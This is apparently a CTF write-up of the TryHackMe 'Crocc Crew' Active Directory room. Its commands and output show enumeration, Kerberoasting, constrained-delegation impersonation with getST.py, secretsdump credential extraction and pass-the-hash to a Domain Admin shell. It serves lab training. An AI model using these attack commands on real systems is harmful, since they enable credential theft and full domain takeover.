---
categories: [TryHackMe]
tags: [ ASREPRoast, Active Directory, AllowedToDelegate, BloodHound, Kerberosting, PrivEsc, rdesktop, constrained_delegation, GetST.py, secretsdump, netexec, lookupsid.py]
media_subpath: /assets/images/
image:
  width: "1200"
  height: "630"
  alt: Active Directory Insane Level Machine 🔔
  path: https://tryhackme-images.s3.amazonaws.com/room-icons/d387f5c6b5c2bfd07451dd27c187e185.png
---

| Machine Link       | [https://tryhackme.com/r/room/crocccrew](https://tryhackme.com/r/room/crocccrew) |
| ------------------ | -------------------------------------------------------------------------------- |
| Operating System   | <mark style="background: #FFB86CA6;">Windows (Active Directory)</mark>                                                       |
| Difficulty         | <mark style="background: #FFB8EBA6;"> Insane </mark>                                                                           |
| Machine Created by | [tryhackme](https://tryhackme.com/p/tryhackme)                                   |

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
└─$ sudo nmap -sC -sV -T4 -oN Nmap_Results.txt 10.10.251.254 -Pn
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 08:59 IST
Nmap scan report for 10.10.251.254
Host is up (0.18s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-04 03:29:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Not valid before: 2024-04-03T03:28:51
|_Not valid after:  2024-10-03T03:28:51
|_ssl-date: 2024-04-04T03:31:02+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-04T03:30:03+00:00
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-04T03:30:06
|_  start_date: N/A
```
{: .nolineno}
{: file='Nmap_Results.txt' .nolineno}
## Web Enumeration ⤵️

When I checked port 80 I got this page 🔻

![Image](Pasted%20image%2020240404090641.png)
_Front Page_

While Enumeration I got this `robots.txt` file that gives me some more files ⏬

![Image](Pasted%20image%2020240404130703.png)
_robots.txt file_

I checked `/backdoor.php` file it only takes input with hello keyword along with only 1 arguments and print it with rest of the text like this ⏬

![Image](Pasted%20image%2020240404130826.png)
_backdoor.php page_

I checked its source code and got this result ⏬

![Image](Pasted%20image%2020240404130854.png)
_source code of backdoor.php page_

Now I looked into `db-config.bak` file that contains the credentials of a user ⏬

![Image](Pasted%20image%2020240404091938.png)
_db-config.bak page_

Lets go for RDP access I tried RDP with Userless access through <mark style="background: #FF5582A6;">rdesktop</mark> Tool.
```bash
rdesktop -r 10.10.182.217
```
{: .nolineno}

I get this user session login sessions and the background image indicates some credentials so I copied it and tried to login with that but I got the following response.

![Image](Pasted%20image%2020240404101239.png)
_Userless RDP session with rdesktop Tool_

Response I got from <span style="color:#fd77f8">Visitor</span> user Login trial : 

![Image](Pasted%20image%2020240404101459.png)
_Visitor Login trial_

Lets see what visitor can do with <mark style="background: #FF5582A6;">netexec</mark> Tool 🔽

![Image](Pasted%20image%2020240404131523.png)
_netexec SMB + RDP updates_

Now lets look into the Shares with <mark style="background: #FF5582A6;">netexec</mark> only with using <mark style="background: #BBFABBA6;">spider_plus</mark> as a module like this : 

![Image](Pasted%20image%2020240404132050.png)
_netexec with spider_plus module_

I got this output ⏬

![Image](Pasted%20image%2020240404132206.png)
_Smb Shares data_

Lets access <mark style="background: #D2B3FFA6;">user.txt</mark> share with <mark style="background: #FF5582A6;">smbclient</mark> Tool ⏬

![Image](Pasted%20image%2020240404132530.png)
_smbclient Tool_


Since this user also have `IPC$` share read access so lets do <mark style="background: #FFB8EBA6;">RID cycling</mark> with <mark style="background: #FF5582A6;">lookupsid.py</mark> Tool from impackets.

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
└─$ python3 /opt/Tools/impacket/examples/lookupsid.py Visitor@cooctus.corp
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Brute forcing SIDs at cooctus.corp
[*] StringBinding ncacn_np:cooctus.corp[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2062199590-3607821280-2073525473
498: COOCTUS\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: COOCTUS\Administrator (SidTypeUser)
501: COOCTUS\Guest (SidTypeUser)
502: COOCTUS\krbtgt (SidTypeUser)
512: COOCTUS\Domain Admins (SidTypeGroup)
513: COOCTUS\Domain Users (SidTypeGroup)
514: COOCTUS\Domain Guests (SidTypeGroup)
515: COOCTUS\Domain Computers (SidTypeGroup)
516: COOCTUS\Domain Controllers (SidTypeGroup)
517: COOCTUS\Cert Publishers (SidTypeAlias)
518: COOCTUS\Schema Admins (SidTypeGroup)
519: COOCTUS\Enterprise Admins (SidTypeGroup)
520: COOCTUS\Group Policy Creator Owners (SidTypeGroup)
521: COOCTUS\Read-only Domain Controllers (SidTypeGroup)
522: COOCTUS\Cloneable Domain Controllers (SidTypeGroup)
525: COOCTUS\Protected Users (SidTypeGroup)
526: COOCTUS\Key Admins (SidTypeGroup)
527: COOCTUS\Enterprise Key Admins (SidTypeGroup)
553: COOCTUS\RAS and IAS Servers (SidTypeAlias)
571: COOCTUS\Allowed RODC Password Replication Group (SidTypeAlias)
572: COOCTUS\Denied RODC Password Replication Group (SidTypeAlias)
1000: COOCTUS\DC$ (SidTypeUser)
1101: COOCTUS\DnsAdmins (SidTypeAlias)
1102: COOCTUS\DnsUpdateProxy (SidTypeGroup)
1109: COOCTUS\Visitor (SidTypeUser)
1115: COOCTUS\mark (SidTypeUser)
1116: COOCTUS\Jeff (SidTypeUser)
1117: COOCTUS\Spooks (SidTypeUser)
1118: COOCTUS\RDP-Users (SidTypeGroup)
1119: COOCTUS\Steve (SidTypeUser)
1120: COOCTUS\Howard (SidTypeUser)
1121: COOCTUS\admCroccCrew (SidTypeUser)
1122: COOCTUS\Fawaz (SidTypeUser)
1123: COOCTUS\karen (SidTypeUser)
1124: COOCTUS\cryillic (SidTypeUser)
1125: COOCTUS\yumeko (SidTypeUser)
1126: COOCTUS\pars (SidTypeUser)
1127: COOCTUS\kevin (SidTypeUser)
1128: COOCTUS\jon (SidTypeUser)
1129: COOCTUS\Varg (SidTypeUser)
1130: COOCTUS\evan (SidTypeUser)
1131: COOCTUS\Ben (SidTypeUser)
1132: COOCTUS\David (SidTypeUser)
1134: COOCTUS\password-reset (SidTypeUser)
1135: COOCTUS\PC-Joiner (SidTypeGroup)
1136: COOCTUS\VPN Access (SidTypeGroup)
1137: COOCTUS\Server Users (SidTypeGroup)
1138: COOCTUS\Restrict DC Login (SidTypeGroup)
1139: COOCTUS\East Coast (SidTypeGroup)
1140: COOCTUS\West Coast (SidTypeGroup)
1141: COOCTUS\File Server Access (SidTypeGroup)
1142: COOCTUS\File Server Admins (SidTypeGroup)
1143: COOCTUS\MSSQL Admins (SidTypeGroup)
1144: COOCTUS\MSSQL Access (SidTypeGroup)
```
{: .nolineno}

I sorted this list and save them in a file <mark style="background: #ABF7F7A6;">users.txt</mark> and looked for some TGT tickets with <mark style="background: #ABF7F7A6;">as-rep-roasting</mark> method through <mark style="background: #FF5582A6;">GetNPUsers.py</mark> Tool from impackets but noluck . 

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
└─$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'cooctus.corp/' -dc-ip 10.10.182.217 -request -usersfile users.txt
Impacket v0.11.0 - Copyright 2023 Fortra


[-] User Administrator does not have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Visitor does not have UF_DONT_REQUIRE_PREAUTH set
[-] User mark does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Jeff does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Spooks does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Steve does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Howard does not have UF_DONT_REQUIRE_PREAUTH set
[-] User admCroccCrew does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Fawaz does not have UF_DONT_REQUIRE_PREAUTH set
[-] User karen does not have UF_DONT_REQUIRE_PREAUTH set
[-] User cryillic does not have UF_DONT_REQUIRE_PREAUTH set
[-] User yumeko does not have UF_DONT_REQUIRE_PREAUTH set
[-] User pars does not have UF_DONT_REQUIRE_PREAUTH set
[-] User kevin does not have UF_DONT_REQUIRE_PREAUTH set
[-] User jon does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Varg does not have UF_DONT_REQUIRE_PREAUTH set
[-] User evan does not have UF_DONT_REQUIRE_PREAUTH set
[-] User Ben does not have UF_DONT_REQUIRE_PREAUTH set
[-] User David does not have UF_DONT_REQUIRE_PREAUTH set
[-] User password-reset does not have UF_DONT_REQUIRE_PREAUTH set
```
{: .nolineno}


Now lets look into <mark style="background: #ABF7F7A6;">kerberostable SPN tickets</mark> with Visitor user credentials with <mark style="background: #FF5582A6;">netexec</mark> Tool this time like this ⏬

```bash
netexec ldap 10.10.182.217 -u Visitor -p '<PASSWORD>' --kerberoasting spn.txt
```
{: .nolineno}

![Image](Pasted%20image%2020240404134635.png)
_netexec kerberostable SPN ticket alternative of `GetUsersSPN.py` from impackets_

Lets crack this SPN ticket for `password-reset` account with <mark style="background: #FF5582A6;">John-The-Ripper</mark> Tool ⏬

![Image](Pasted%20image%2020240404134932.png)
_John-the-ripper Tool_

Lets start bloodhound now with <span style="color:#fd77f8">password-reset</span> Users credentials like this ⏬

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
└─$ bloodhound-python -u 'password-reset' -p '<PASSWORD>' -ns 10.10.182.217 -d cooctus.corp -c all
INFO: Found AD domain: cooctus.corp
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.cooctus.corp
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.cooctus.corp
INFO: Connecting to LDAP server: dc.cooctus.corp
INFO: Found 17 users
INFO: Found 63 groups
INFO: Found 2 gpos
INFO: Found 11 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.COOCTUS.CORP
INFO: Done in 00M 49S
```
{: .nolineno}


![Image](Pasted%20image%2020240404143758.png)
_Bloodhound Data Analysis_

For <mark style="background: #ADCCFFA6;">AllowedToDelegate</mark> Privileges to Abuse ,which means that I means user <span style="color:#fd77f8">password-reset</span> can impersonate to another user like this ⏬

![Image](Pasted%20image%2020240404143926.png)
_AllowedToDelegate privileges_

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
└─$ python3 /opt/Tools/impacket/examples/getST.py -spn 'oakley/DC' -dc-ip 10.10.180.93 -impersonate 'Administrator' 'cooctus.corp/password-reset:<PASSWORD'
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@oakley_DC@COOCTUS.CORP.ccache
```
{: .nolineno}

Now I got the impersonation ticket for administrator , lets export it to its kerbrose variable <span style="color:#f04276">KRB5CCNAME</span> .

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
└─$ export KRB5CCNAME=Administrator@oakley_DC@COOCTUS.CORP.ccache 
```
{: .nolineno}

Now it is exported lets extract the secrets through <mark style="background: #FF5582A6;">secretsdump</mark> Tool from impacket like this ⏬

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
└─$ impacket-secretsdump -no-pass -k dc             
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080........1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae..........0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesnt have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:ba0fdf2439a8aa435e22682ae391f03d7029b22371649eb26fa4134fdec948dba579a319ce114da1126d88c141339b6312b8027f4bc4a5f57a71d36ba61d7aa4bc31fd6c6948aa5fc287c7aba63383e8201c9799ecb1df3022be30ea334d8de4f7b1dda251bde864388cb502ab4b0fda4273431a437efd1a341ff21a174ba141f82c55b3a7a85d9f556931902b5664f10af29bef75806276eec4bb6be28a16ca095e300f25816d09aaf10c2fbec79ebe1cf5917bf79e059c87185d8a340e84b2f8819918f5a09bd030da3a4f26c91d66d1363ecf98ac5a1d537751b130f758c0565e9e53a1af803........2c7320
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:fa8e768b7015f2511be........062787:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.,k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ad....................022d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747................797e:::
COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:87..................912cb2e9e97bbb1:::
COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90d..................0848244ef:::
COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099.............3cc9b7:::
...
```
{: .nolineno}

Lets **Pass-the-Hash** and get the shell of Administrator like this 🔻


```powershell
┌──(kali㉿kali)-[~/Downloads/Tryhackme/crocc_crew]
└─$ evil-winrm -i 10.10.180.93 -u Administrator -H <HASH>
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> whoami
cooctus\administrator
*Evil-WinRM* PS C:\Users\Administrator> tree /f /a
Folder PATH listing
Volume serial number is 1296-13D1
C:.
+---3D Objects
+---Contacts
+---Desktop
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
|       crocc-crew-wallpaper.png
|
+---Saved Games
+---Searches
\---Videos
*Evil-WinRM* PS C:\Users\Administrator>
```
{: .nolineno}

I am Domain Admin Now !




> If you have any questions or suggestions, please leave a comment below.
> Thank You ! 
{: .prompt-tip }